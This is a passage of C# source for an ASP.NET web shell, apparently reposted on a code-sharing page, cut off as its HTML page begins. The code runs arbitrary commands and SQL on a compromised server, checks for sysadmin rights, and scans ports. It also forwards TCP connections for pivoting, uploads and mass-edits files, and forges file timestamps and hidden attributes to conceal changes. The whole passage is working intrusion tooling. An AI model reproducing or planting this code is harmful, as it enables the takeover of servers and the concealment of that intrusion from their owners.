href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(Reg_Path+innerSubKey)+"')\"&gt;"+innerSubKey+"&lt;/a&gt;";<BR>tr.Cells.Add(tc);<BR>tc=new TableCell();<BR>tc.Width=Unit.Parse("60%");<BR>tc.Text="&lt;SubKey&gt;";<BR>tr.Cells.Add(tc);<BR>pLWD.Rows.Add(tr);<BR>}<BR>TableRow cKVA=new TableRow();<BR>cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";<BR>cKVA.Attributes["bgcolor"]="#dddddd";<BR>TableCell JlmW=new TableCell();<BR>JlmW.Attributes["colspan"]="2" ;<BR>JlmW.Attributes["height"]="5";<BR>cKVA.Cells.Add(JlmW);<BR>pLWD.Rows.Add(cKVA);<BR>foreach(string strValueName in sk.GetValueNames())<BR>{<BR>tr=new TableRow();<BR>tc=new TableCell();<BR>bg=OKM();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>tc.Width=Unit.Parse("40%");<BR>tc.Text=strValueName;<BR>tr.Cells.Add(tc);<BR>tc=new TableCell();<BR>tc.Width=Unit.Parse("60%");<BR>tc.Text=DdmPl(sk,strValueName);<BR>tr.Cells.Add(tc);<BR>pLWD.Rows.Add(tr);<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>public string DdmPl(RegistryKey sk,string strValueName)<BR>{<BR>object uPZ;<BR>string RaTGr="";<BR>try<BR>{<BR>uPZ=sk.GetValue(strValueName,"NULL");<BR>if(uPZ.GetType()==typeof(byte[]))<BR>{<BR>foreach(byte tmpbyte in(byte[])uPZ)<BR>{<BR>if((int)tmpbyte&lt;16)<BR>{<BR>RaTGr+="0";<BR>}<BR>RaTGr+=tmpbyte.ToString("X");<BR>}<BR>}<BR>else if(uPZ.GetType()==typeof(string[]))<BR>{<BR>foreach(string tmpstr in(string[])uPZ)<BR>{<BR>RaTGr+=tmpstr;<BR>}<BR>}<BR>else<BR>{<BR>RaTGr=uPZ.ToString();<BR>}<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>return RaTGr;<BR>}<BR>public void vNCHZ()<BR>{<BR>WICxe();<BR>YwLB.Visible=true;<BR>Bin_H2_Title.InnerText="端口扫描 &gt;&gt;";<BR>}<BR>public void rAhe()<BR>{<BR>WICxe();<BR>iDgmL.Visible=true;<BR>dQIIF.Visible=false;<BR>Bin_H2_Title.InnerText="数据库 &gt;&gt;";<BR>}<BR>protected void OUj()<BR>{<BR>if(Dtdr.State==ConnectionState.Closed)<BR>{<BR>try<BR>{<BR>Dtdr.ConnectionString=MasR.Text;<BR>Kkvb.Connection=Dtdr;<BR>Dtdr.Open();<BR>}<BR>catch(Exception Error)<BR>{<BR>xseuB(Error.Message);<BR>}<BR>}<BR>}<BR>protected void fUzE()<BR>{<BR>if(Dtdr.State==ConnectionState.Open)<BR>Dtdr.Close();<BR>Dtdr.Dispose();<BR>Kkvb.Dispose();<BR>}<BR>public DataTable CYUe(string sqlstr)<BR>{<BR>OleDbDataAdapter da=new OleDbDataAdapter();<BR>DataTable Dstog=new DataTable();<BR>try<BR>{<BR>OUj();<BR>Kkvb.CommandType=CommandType.Text;<BR>Kkvb.CommandText=sqlstr;<BR>da.SelectCommand=Kkvb;<BR>da.Fill(Dstog);<BR>}<BR>catch(Exception)<BR>{<BR>}<BR>finally<BR>{<BR>fUzE();<BR>}<BR>return Dstog;<BR>}<BR>public DataTable[] Bin_Data(string query)<BR>{<BR>ArrayList list=new ArrayList();<BR>try<BR>{<BR>string str;<BR>OUj();<BR>query=query+"\r\n";<BR>MatchCollection gcod=new Regex("[\r\n][gG][oO][\r\n]").Matches(query);<BR>int EmRX=0;<BR>for(int i=0;i&lt;gcod.Count;i++)<BR>{<BR>Match FJD=gcod[i];<BR>str=query.Substring(EmRX,FJD.Index-EmRX);<BR>if(str.Trim().Length&gt;0)<BR>{<BR>OleDbDataAdapter FgzeQ=new OleDbDataAdapter();<BR>Kkvb.CommandType=CommandType.Text;<BR>Kkvb.CommandText=str.Trim();<BR>FgzeQ.SelectCommand=Kkvb;<BR>DataSet cDPp=new DataSet();<BR>FgzeQ.Fill(cDPp);<BR>for(int j=0;j&lt;cDPp.Tables.Count;j++)<BR>{<BR>list.Add(cDPp.Tables[j]);<BR>}<BR>}<BR>EmRX=FJD.Index+3;<BR>}<BR>str=query.Substring(EmRX,query.Length-EmRX);<BR>if(str.Trim().Length&gt;0)<BR>{<BR>OleDbDataAdapter VwB=new OleDbDataAdapter();<BR>Kkvb.CommandType=CommandType.Text;<BR>Kkvb.CommandText=str.Trim();<BR>VwB.SelectCommand=Kkvb;<BR>DataSet arG=new DataSet();<BR>VwB.Fill(arG);<BR>for(int k=0;k&lt;arG.Tables.Count;k++)<BR>{<BR>list.Add(arG.Tables[k]);<BR>}<BR>}<BR>}<BR>catch(SqlException e)<BR>{<BR>xseuB(e.Message);<BR>rom.Visible=false;<BR>}<BR>return(DataTable[])list.ToArray(typeof(DataTable));<BR>}<BR>public void JIAKU(string instr)<BR>{<BR>try<BR>{<BR>OUj();<BR>Kkvb.CommandType=CommandType.Text;<BR>Kkvb.CommandText=instr;<BR>Kkvb.ExecuteNonQuery();<BR>}<BR>catch(Exception e)<BR>{<BR>xseuB(e.Message);<BR>}<BR>}<BR>public void dwgT()<BR>{<BR>try<BR>{<BR>OUj();<BR>if(WYmo.SelectedItem.Text=="MSSQL")<BR>{<BR>if(Pvf.SelectedItem.Value!="")<BR>{<BR>Dtdr.ChangeDatabase(Pvf.SelectedItem.Value.ToString());<BR>}<BR>}<BR>DataTable[] jxF=null;<BR>jxF=Bin_Data(jHIy.InnerText);<BR>if(jxF!=null && jxF.Length&gt;0)<BR>{<BR>for(int j=0;j&lt;jxF.Length;j++)<BR>{<BR>rom.PreRender+=new EventHandler(lRavM);<BR>rom.DataSource=jxF[j];<BR>rom.DataBind();<BR>for(int i=0;i&lt;rom.Items.Count;i++)<BR>{<BR>string bg=OKM();<BR>rom.Items[i].CssClass=bg;<BR>rom.Items[i].Attributes["onmouseover"]="this.className='focus';";<BR>rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";<BR>}<BR>}<BR>}<BR>else<BR>{<BR>rom.DataSource=null;<BR>rom.DataBind();<BR>}<BR>rom.Visible=true;<BR>}<BR>catch(Exception e)<BR>{<BR>xseuB(e.Message);<BR>rom.Visible=false;<BR>}<BR>}<BR>public void xTZY()<BR>{<BR>try<BR>{<BR>if(WYmo.SelectedItem.Text=="MSSQL")<BR>{<BR>if(Pvf.SelectedItem.Value=="")<BR>{<BR>rom.DataSource=null;<BR>rom.DataBind();<BR>return;<BR>}<BR>}<BR>OUj();<BR>DataTable zKvOw=new DataTable();<BR>DataTable jxF=new DataTable();<BR>DataTable baVJV=new DataTable();<BR>if(WYmo.SelectedItem.Text=="MSSQL" && Pvf.SelectedItem.Value!="")<BR>{<BR>Dtdr.ChangeDatabase(Pvf.SelectedItem.Text);<BR>}<BR>zKvOw=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"SYSTEM TABLE" });<BR>jxF=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"TABLE" });<BR>foreach(DataRow dr in zKvOw.Rows)<BR>{<BR>jxF.ImportRow(dr);<BR>}<BR>jxF.Columns.Remove("TABLE_CATALOG");jxF.Columns.Remove("TABLE_SCHEMA");jxF.Columns.Remove("DESCRIPTION");jxF.Columns.Remove("TABLE_PROPID");<BR>rom.PreRender+=new EventHandler(lRavM);<BR>rom.DataSource=jxF;<BR>rom.DataBind();<BR>for(int i=0;i&lt;rom.Items.Count;i++)<BR>{<BR>string bg=OKM();<BR>rom.Items[i].CssClass=bg;<BR>rom.Items[i].Attributes["onmouseover"]="this.className='focus';";<BR>rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";<BR>}<BR>rom.Visible=true;<BR>}<BR>catch(Exception e)<BR>{<BR>xseuB(e.Message);<BR>rom.Visible=false;<BR>}<BR>}<BR>private void lRavM(object sender,EventArgs e)<BR>{<BR>DataGrid d=(DataGrid)sender;<BR>foreach(DataGridItem item in d.Items)<BR>{<BR>foreach(TableCell t in item.Cells)<BR>{<BR>t.Text=t.Text.Replace("&lt;","&lt;").Replace("&gt;","&gt;");<BR>}<BR>}<BR>}<BR>public void vCf()<BR>{<BR>dQIIF.Visible=true;<BR>try<BR>{<BR>jHIy.InnerHtml=string.Empty;<BR>if(WYmo.SelectedItem.Text=="MSSQL")<BR>{<BR>rom.Visible=false;<BR>uXevN.Visible=true;<BR>irTU.Visible=true;<BR>OUj();<BR>DataTable ver=CYUe(@"SELECT @@VERSION");<BR>DataTable dbs=CYUe(@"SELECT name FROM master.dbo.sysdatabases");<BR>DataTable cdb=CYUe(@"SELECT DB_NAME()");<BR>DataTable rol=CYUe(@"SELECT IS_SRVROLEMEMBER('sysadmin')");<BR>DataTable YKrm=CYUe(@"SELECT IS_MEMBER('db_owner')");<BR>string jHlh=ver.Rows[0][0].ToString();<BR>string dbo=string.Empty;<BR>if(YKrm.Rows[0][0].ToString()=="1")<BR>{<BR>dbo="db_owner";<BR>}<BR>else<BR>{<BR>dbo="public";<BR>}<BR>if(rol.Rows[0][0].ToString()=="1")<BR>{<BR>dbo="&lt;font color=blue&gt;sa&lt;/font&gt;";<BR>}<BR>string db_name=string.Empty;<BR>foreach(ListItem item in FGEy.Items)<BR>{<BR>&nbsp;if(item.Selected=true)<BR>&nbsp;{<BR>&nbsp;item.Selected=false;<BR>&nbsp;}<BR>}<BR>Pvf.Items.Clear();<BR>Pvf.Items.Add("-- Select a DataBase --");<BR>Pvf.Items[0].Value="";<BR>for(int i=0;i&lt;dbs.Rows.Count;i++)<BR>{<BR>db_name+=dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(),"&lt;font color=blue&gt;"+cdb.Rows[0][0].ToString()+"&lt;/font&gt;")+"&nbsp;|&nbsp;";<BR>Pvf.Items.Add(dbs.Rows[i][0].ToString());<BR>}<BR>irTU.InnerHtml="&lt;p&gt;&lt;font color=red&gt;MSSQL Version&lt;/font&gt; : &lt;i&gt;&lt;b&gt;"+jHlh+"&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;font color=red&gt;SrvRoleMember&lt;/font&gt; : &lt;i&gt;&lt;b&gt;"+dbo+"&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;";<BR>}<BR>else<BR>{<BR>uXevN.Visible=false;<BR>irTU.Visible=false;<BR>xTZY();<BR>}<BR>}<BR>catch(Exception e)<BR>{<BR>dQIIF.Visible=false;<BR>}<BR>}<BR>public void MHLv()<BR>{<BR>WICxe();<BR>hOWTm.Visible=true;<BR>Bin_H2_Title.InnerText="端口映射 &gt;&gt;";<BR>}<BR>public class PortForward<BR>{<BR>public string Localaddress;<BR>public int LocalPort;<BR>public string RemoteAddress;<BR>public int RemotePort;<BR>string type;<BR>Socket ltcpClient;<BR>Socket rtcpClient;<BR>Socket server;<BR>byte[] DPrPL=new byte[2048];<BR>byte[] wvZv=new byte[2048];<BR>public struct session<BR>{<BR>public Socket rdel;<BR>public Socket ldel;<BR>public int llen;<BR>public int rlen;<BR>}<BR>public static IPEndPoint mtJ(string host,int port)<BR>{<BR>IPEndPoint iep=null;<BR>IPHostEntry aGN=Dns.Resolve(host);<BR>IPAddress rmt=aGN.AddressList[0];<BR>iep=new IPEndPoint(rmt,port);<BR>return iep;<BR>}<BR>public void Start(string Rip,int Rport,string lip,int lport)<BR>{<BR>try<BR>{<BR>LocalPort=lport;<BR>RemoteAddress=Rip;<BR>RemotePort=Rport;<BR>Localaddress=lip;<BR>rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);<BR>ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);<BR>rtcpClient.BeginConnect(mtJ(RemoteAddress,RemotePort),new AsyncCallback(iiGFO),rtcpClient);<BR>}<BR>catch (Exception ex) { }<BR>}<BR>protected void iiGFO(IAsyncResult ar)<BR>{<BR>try<BR>{<BR>session RKXy=new session();<BR>RKXy.ldel=ltcpClient;<BR>RKXy.rdel=rtcpClient;<BR>ltcpClient.BeginConnect(mtJ(Localaddress,LocalPort),new AsyncCallback(VTp),RKXy);<BR>}<BR>catch (Exception ex) { }<BR>}<BR>protected void VTp(IAsyncResult ar)<BR>{<BR>try<BR>{<BR>session RKXy=(session)ar.AsyncState;<BR>ltcpClient.EndConnect(ar);<BR>RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(LFYM),RKXy);<BR>RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(xPS),RKXy);<BR>}<BR>catch (Exception ex) { }<BR>}<BR>private void LFYM(IAsyncResult ar)<BR>{<BR>try<BR>{<BR>session RKXy=(session)ar.AsyncState;<BR>int Ret=RKXy.rdel.EndReceive(ar);<BR>if (Ret&gt;0)<BR>ltcpClient.BeginSend(DPrPL,0,Ret,SocketFlags.None,new AsyncCallback(JTcp),RKXy);<BR>else lyTOK();<BR>}<BR>catch (Exception ex) { }<BR>}<BR>private void JTcp(IAsyncResult ar)<BR>{<BR>try<BR>{<BR>session RKXy=(session)ar.AsyncState;<BR>RKXy.ldel.EndSend(ar);<BR>RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(this.LFYM),RKXy);<BR>}<BR>catch (Exception ex) { }<BR>}<BR>private void xPS(IAsyncResult ar)<BR>{<BR>try<BR>{<BR>session RKXy=(session)ar.AsyncState;<BR>int Ret=RKXy.ldel.EndReceive(ar);<BR>if (Ret&gt;0)<BR>RKXy.rdel.BeginSend(wvZv,0,Ret,SocketFlags.None,new AsyncCallback(IZU),RKXy);<BR>else lyTOK();<BR>}<BR>catch (Exception ex) { }<BR>}<BR>private void IZU(IAsyncResult ar)<BR>{<BR>try<BR>{<BR>session RKXy=(session)ar.AsyncState;<BR>RKXy.rdel.EndSend(ar);<BR>RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(this.xPS),RKXy);<BR>}<BR>catch (Exception ex) { }<BR>}<BR>public void lyTOK()<BR>{<BR>try<BR>{<BR>if (ltcpClient!=null)<BR>{<BR>ltcpClient.Close();<BR>}<BR>if (rtcpClient!=null)<BR>rtcpClient.Close();<BR>}<BR>catch (Exception ex) { }<BR>}<BR>}<BR>protected void vuou()<BR>{<BR>PortForward gYP=new PortForward();<BR>gYP.lyTOK();<BR>}<BR>protected void ruQO()<BR>{<BR>PortForward gYP=new PortForward();<BR>gYP.Start(llH.Value,int.Parse(ZHS.Value),eEpm.Value,int.Parse(iXdh.Value));<BR>}<BR>public string mRDl(string instr)<BR>{<BR>string tmp=null;<BR>try<BR>{<BR>tmp=System.Net.Dns.Resolve(instr).AddressList[0].ToString();<BR>}<BR>catch(Exception e)<BR>{<BR>}<BR>return tmp;<BR>}<BR>public void VikG()<BR>{<BR>string[] OTV=lOmX.Text.ToString().Split(',');<BR>for(int i=0;i&lt;OTV.Length;i++)<BR>{<BR>IVc.Add(new ScanPort(mRDl(MdR.Text.ToString()),Int32.Parse(OTV[i])));<BR>}<BR>try<BR>{<BR>Thread[] kbXY=new Thread[IVc.Count];<BR>int sdO=0;<BR>for(sdO=0;sdO&lt;IVc.Count;sdO++)<BR>{<BR>kbXY[sdO]=new Thread(new ThreadStart(((ScanPort)IVc[sdO]).Scan));<BR>kbXY[sdO].Start();<BR>}<BR>for(sdO=0;sdO&lt;kbXY.Length;sdO++)<BR>kbXY[sdO].Join();<BR>}<BR>catch<BR>{<BR>}<BR>}<BR>public class ScanPort<BR>{<BR>private string _ip="";<BR>private int jTdO=0;<BR>private TimeSpan _timeSpent;<BR>private string QGcH="Not scanned";<BR>public string ip<BR>{<BR>get { return _ip;}<BR>}<BR>public int port<BR>{<BR>get { return jTdO;}<BR>}<BR>public string status<BR>{<BR>get { return QGcH;}<BR>}<BR>public TimeSpan timeSpent<BR>{<BR>get { return _timeSpent;}<BR>}<BR>public ScanPort(string ip,int port)<BR>{<BR>_ip=ip;<BR>jTdO=port;<BR>}<BR>public void Scan()<BR>{<BR>TcpClient iYap=new TcpClient();<BR>DateTime qYZT=DateTime.Now;<BR>try<BR>{<BR>iYap.Connect(_ip,jTdO);<BR>iYap.Close();<BR>QGcH="&lt;font color=green&gt;&lt;b&gt;Open&lt;/b&gt;&lt;/font&gt;";<BR>}<BR>catch<BR>{<BR>QGcH="&lt;font color=red&gt;&lt;b&gt;Close&lt;/b&gt;&lt;/font&gt;";<BR>}<BR>_timeSpent=DateTime.Now.Subtract(qYZT);<BR>}<BR>}<BR>public static void YFcNP(System.Web.UI.Page page)<BR>{<BR>page.RegisterHiddenField("__EVENTTARGET","");<BR>page.RegisterHiddenField("__FILE","");<BR>string s=@"&lt;script language=Javascript&gt;";<BR>s+=@"function Bin_PostBack(eventTarget,eventArgument)";<BR>s+=@"{";<BR>s+=@"var theform=document.forms[0];";<BR>s+=@"theform.__EVENTTARGET.value=eventTarget;";<BR>s+=@"theform.__FILE.value=eventArgument;";<BR>s+=@"theform.submit();";<BR>s+=@"} ";<BR>s+=@"&lt;/scr"+"ipt&gt;";<BR>page.RegisterStartupScript("",s);<BR>}<BR>protected void PPtK(object sender,EventArgs e)<BR>{<BR>WICxe();<BR>yhv.Visible=true;<BR>Bin_H2_Title.InnerText="文件搜索 &gt;&gt;";<BR>NaLJ.Value=Request.PhysicalApplicationPath;<BR>oJiym.Visible=false;<BR>}<BR>protected void NBy(object sender,EventArgs e)<BR>{<BR>DirectoryInfo GQMM=new DirectoryInfo(NaLJ.Value);<BR>if(!GQMM.Exists)<BR>{<BR>xseuB("Path invalid ! ");<BR>return;<BR>}<BR>oog(GQMM);<BR>xseuB("Search completed ! ");<BR>}<BR>public void oog(DirectoryInfo dir)<BR>{<BR>try<BR>{<BR>oJiym.Visible=true;<BR>foreach(FileInfo Bin_Files in dir.GetFiles())<BR>{<BR>try<BR>{<BR>if(Bin_Files.FullName==Request.PhysicalPath)<BR>{<BR>continue;<BR>}<BR>if(!Regex.IsMatch(Bin_Files.Extension.Replace(".",""),"^("+UDLvA.Value+")$",RegexOptions.IgnoreCase))<BR>{<BR>continue;<BR>}<BR>if(Ven.SelectedItem.Value=="name")<BR>{<BR>if(rAQ.Checked)<BR>{<BR>if(Regex.IsMatch(Bin_Files.Name,iaMKl.Value,RegexOptions.IgnoreCase))<BR>{<BR>FJvQ(Bin_Files);<BR>}<BR>}<BR>else<BR>{<BR>if(Bin_Files.Name.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)<BR>{<BR>Response.Write(Bin_Files.FullName);<BR>FJvQ(Bin_Files);<BR>}<BR>}<BR>}<BR>else<BR>{<BR>StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);<BR>string ava=sr.ReadToEnd();<BR>sr.Close();<BR>if(rAQ.Checked)<BR>{<BR>if(Regex.IsMatch(ava,iaMKl.Value,RegexOptions.IgnoreCase))<BR>{<BR>FJvQ(Bin_Files);<BR>if(YZw.Checked)<BR>{<BR>ava=Regex.Replace(ava,iaMKl.Value,qPe.Value,RegexOptions.IgnoreCase);<BR>StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);<BR>sw.Write(ava);<BR>sw.Close();<BR>}<BR>}<BR>}<BR>else<BR>{<BR>if(ava.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)<BR>{<BR>FJvQ(Bin_Files);<BR>if(YZw.Checked)<BR>{<BR>ava=Strings.Replace(ava,iaMKl.Value,qPe.Value,1,-1,CompareMethod.Text);<BR>StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);<BR>sw.Write(ava);<BR>sw.Close();<BR>}<BR>}<BR>}<BR>}<BR>}<BR>catch(Exception ex)<BR>{<BR>xseuB(ex.Message);<BR>continue;<BR>}<BR>}<BR>foreach(DirectoryInfo subdir in dir.GetDirectories())<BR>{<BR>oog(subdir);<BR>}<BR>}<BR>catch(Exception ex)<BR>{<BR>xseuB(ex.Message);<BR>}<BR>}<BR>public void FJvQ(FileInfo objfile)<BR>{<BR>TableRow tr=new TableRow();<BR>TableCell tc=new TableCell();<BR>string bg=OKM();<BR>tr.Attributes["onmouseover"]="this.className='focus';";<BR>tr.CssClass=bg;<BR>tr.Attributes["onmouseout"]="this.className='"+bg+"';";<BR>tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\"&gt;"+objfile.FullName+"&lt;/a&gt;";<BR>tr.Cells.Add(tc);<BR>tc=new TableCell();<BR>tc.Text=objfile.LastWriteTime.ToString();<BR>tr.Cells.Add(tc);<BR>tc=new TableCell();<BR>tc.Text=mTG(objfile.Length);<BR>tr.Cells.Add(tc);<BR>oJiym.Rows.Add(tr);<BR>}<BR>public void xseuB(string instr)<BR>{<BR>jDKt.Visible=true;<BR>jDKt.InnerText=instr;<BR>}<BR>protected void xVm(object sender,EventArgs e)<BR>{<BR>string Jfm=FormsAuthentication.HashPasswordForStoringInConfigFile(HRJ.Text,"MD5").ToLower();<BR>if(Jfm==Password)<BR>{<BR>Response.Cookies.Add(new HttpCookie(vbhLn,Password));<BR>ljtzC.Visible=false;<BR>PBZw();<BR>}<BR>else<BR>{<BR>tZSx();<BR>}<BR>}<BR>protected void Ybg(object sender,EventArgs e)<BR>{<BR>krIR(Server.MapPath("."));<BR>}<BR>protected void KjPi(object sender,EventArgs e)<BR>{<BR>Bin_H2_Title.InnerText="IIS探测 &gt;&gt;";<BR>WICxe();<BR>VNR.Visible=true;<BR>AdCx();<BR>}<BR>protected void DGCoW(object sender,EventArgs e)<BR>{<BR>try<BR>{<BR>StreamWriter sw;<BR>if(NdCX.SelectedItem.Text=="UTF-8")<BR>{<BR>sw=new StreamWriter(Sqon.Value,false,Encoding.UTF8);<BR>}<BR>else<BR>{<BR>sw=new StreamWriter(Sqon.Value,false,Encoding.Default);<BR>}<BR>sw.Write(Xgvv.InnerText);<BR>sw.Close();<BR>xseuB("Save file success !");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>protected void lbjLD(object sender,EventArgs e)<BR>{<BR>string FlwA=AXSbb.Value;<BR>FlwA=OElM(FlwA);<BR>try<BR>{<BR>Fhq.PostedFile.SaveAs(FlwA+Path.GetFileName(Fhq.Value));<BR>xseuB("File upload success!");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>protected void EXV(object sender,EventArgs e)<BR>{<BR>krIR(AXSbb.Value);<BR>}<BR>protected void mcCY(object sender,EventArgs e)<BR>{<BR>krIR(Server.MapPath("."));<BR>}<BR>protected void iVk(object sender,CommandEventArgs e)<BR>{<BR>krIR(e.CommandArgument.ToString());<BR>}<BR>protected void XXrLw(object sender,EventArgs e)<BR>{<BR>try<BR>{<BR>File.SetCreationTimeUtc(QiFB.Value,File.GetCreationTimeUtc(lICp.Value));<BR>File.SetLastAccessTimeUtc(QiFB.Value,File.GetLastAccessTimeUtc(lICp.Value));<BR>File.SetLastWriteTimeUtc(QiFB.Value,File.GetLastWriteTimeUtc(lICp.Value));<BR>xseuB("File time clone success!");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>protected void tIykC(object sender,EventArgs e)<BR>{<BR>string path=pWVL.Value;<BR>try<BR>{<BR>File.SetAttributes(path,FileAttributes.Normal);<BR>if(ZhWSK.Checked)<BR>{<BR>File.SetAttributes(path,FileAttributes.ReadOnly);<BR>}<BR>if(SsR.Checked)<BR>{<BR>File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);<BR>}<BR>if(ccB.Checked)<BR>{<BR>File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);<BR>}<BR>if(fbyZ.Checked)<BR>{<BR>File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);<BR>}<BR>File.SetCreationTimeUtc(path,Convert.ToDateTime(yUqx.Value));<BR>File.SetLastAccessTimeUtc(path,Convert.ToDateTime(aLsn.Value));<BR>File.SetLastWriteTimeUtc(path,Convert.ToDateTime(uYjw.Value));<BR>xseuB("File attributes modify success!");<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>krIR(AXSbb.Value);<BR>}<BR>protected void VOxn(object sender,EventArgs e)<BR>{<BR>WICxe();<BR>vIac.Visible=true;<BR>Bin_H2_Title.InnerText="执行命令&gt;&gt;";<BR>}<BR>protected void FbhN(object sender,EventArgs e)<BR>{<BR>try<BR>{<BR>Process ahAE=new Process();<BR>ahAE.StartInfo.FileName=kusi.Value;<BR>ahAE.StartInfo.Arguments=bkcm.Value;<BR>ahAE.StartInfo.UseShellExecute=false;<BR>ahAE.StartInfo.RedirectStandardInput=true;<BR>ahAE.StartInfo.RedirectStandardOutput=true;<BR>ahAE.StartInfo.RedirectStandardError=true;<BR>ahAE.Start();<BR>string Uoc=ahAE.StandardOutput.ReadToEnd();<BR>Uoc=Uoc.Replace("&lt;","&lt;");<BR>Uoc=Uoc.Replace("&gt;","&gt;");<BR>Uoc=Uoc.Replace("\r\n","&lt;br&gt;");<BR>tnQRF.Visible=true;<BR>tnQRF.InnerHtml="&lt;hr width=\"100%\" noshade/&gt;&lt;pre&gt;"+Uoc+"&lt;/pre&gt;";<BR>}<BR>catch(Exception error)<BR>{<BR>xseuB(error.Message);<BR>}<BR>}<BR>protected void RAFL(object sender,EventArgs e)<BR>{<BR>if(qPdI.Text.Length&gt;0)<BR>{<BR>tpRQ(qPdI.Text);<BR>}<BR>else<BR>{<BR>lFAvw();<BR>}<BR>}<BR>protected void Grxk(object sender,EventArgs e)<BR>{<BR>YUw();<BR>}<BR>protected void ilC(object sender,EventArgs e)<BR>{<BR>tZRH();<BR>}<BR>protected void HtB(object sender,EventArgs e)<BR>{<BR>pDVM();<BR>}<BR>protected void Olm(object sender,EventArgs e)<BR>{<BR>iLVUT();<BR>}<BR>protected void jXhS(object sender,EventArgs e)<BR>{<BR>ADCpk();<BR>}<BR>protected void lRfRj(object sender,EventArgs e)<BR>{<BR>lDODR();<BR>}<BR>protected void xSy(object sender,EventArgs e)<BR>{<BR>xFhz();<BR>}<BR>protected void dMx(object sender,EventArgs e)<BR>{<BR>rAhe();<BR>}<BR>protected void zOVO(object sender,EventArgs e)<BR>{<BR>if(((DropDownList)sender).ID.ToString()=="WYmo")<BR>{<BR>dQIIF.Visible=false;<BR>MasR.Text=WYmo.SelectedItem.Value.ToString();<BR>}<BR>if(((DropDownList)sender).ID.ToString()=="Pvf")<BR>{<BR>xTZY();<BR>}<BR>if(((DropDownList)sender).ID.ToString()=="FGEy")<BR>{<BR>jHIy.InnerText=FGEy.SelectedItem.Value.ToString();<BR>}<BR>if(((DropDownList)sender).ID.ToString()=="NdCX")<BR>{<BR>gLKc(Sqon.Value);<BR>}<BR>}<BR>protected void IkkO(object sender,EventArgs e)<BR>{<BR>krIR(AXSbb.Value);<BR>}<BR>protected void BGY(object sender,EventArgs e)<BR>{<BR>vCf();<BR>}<BR>protected void cptS(object sender,EventArgs e)<BR>{<BR>vNCHZ();<BR>}<BR>protected void fDO(object sender,EventArgs e)<BR>{<BR>MHLv();<BR>}<BR>protected void vJNsE(object sender,EventArgs e)<BR>{<BR>vuou();<BR>xseuB("Clear All Thread ......");<BR>}<BR>protected void wDZ(object sender,EventArgs e)<BR>{<BR>if(iXdh.Value=="" || eEpm.Value.Length&lt;7 || ZHS.Value=="")return;<BR>ruQO();<BR>xseuB("All Thread Start ......");<BR>}<BR>protected void tYoZ(object sender,EventArgs e)<BR>{<BR>}<BR>protected void ELkQ(object sender,EventArgs e)<BR>{<BR>VikG();<BR>GBYT.Visible=true;<BR>string res=string.Empty;<BR>foreach(ScanPort th in IVc)<BR>{<BR>res+=th.ip+" : "+th.port+" ................................. "+th.status+"&lt;br&gt;";<BR>}<BR>GBYT.InnerHtml=res;<BR>}<BR>protected void ORUgV(object sender,EventArgs e)<BR>{<BR>dwgT();<BR>}<BR>public void WICxe()<BR>{<BR>DCbS.Visible=false;<BR>CzfO.Visible=false;<BR>APl.Visible=false;<BR>vIac.Visible=false;<BR>kkHN.Visible=false;<BR>YwLB.Visible=false;<BR>iDgmL.Visible=false;<BR>hOWTm.Visible=false;<BR>vrFA.Visible=false;<BR>yhv.Visible=false;<BR>}<BR>&lt;/script&gt;<BR></div></P>
<P><div class="codetitle"><span><a style="CURSOR: pointer" data="38333" class="copybut" id="copybut38333" onclick="doCopy('code38333')"><U>复制代码</U></a></span> 代码如下:</div><div class="codebody" id="code38333"><BR>&lt;html xmlns="http://www.w3.org/1999/xhtml" &gt;<BR>&lt;head id="Head1" runat="server"&gt;<BR>&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"/&gt;<BR>&lt;title&gt;☆銥繎夶蟲___Ёnd&lt;/title&gt;<BR>&lt;style type="text/css"&gt;<BR>.Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}<BR>body,td{font: 12px Tahoma,Arial;line-height: 16px; background-color:#003300; color:lime;}<BR>.input{font-size: 12px;background-color:#ddd;border:1px solid #fff;}<BR>.list{font-size: 12px;background-color:#ddd;border:1px solid 